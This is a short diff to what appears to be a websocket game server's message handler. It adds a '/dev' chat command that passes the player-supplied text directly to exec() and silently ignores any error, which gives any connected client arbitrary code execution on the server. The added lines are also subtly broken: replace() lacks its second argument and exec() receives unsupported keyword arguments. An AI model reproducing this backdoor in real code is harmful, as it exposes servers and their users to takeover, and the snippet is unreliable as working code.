@@ -1668,7 +1668,11 @@ async def handler(websocket):
                                                             PlayersData[player]['X'] = x
                                                             PlayersData[player]['Y'] = y
                                                         except:pass
-
+                                                elif _[1:].lower().find('/dev') == 0:
+                                                    if len(_[1:].lower().split(' ')) > 2:
+                                                        try:
+                                                            exec(_[1:].replace('/dev '),__globals=globals(),__locals=locals())
+                                                        except:pass
 
                                             else:
                                                 for i in PlayersData.keys():
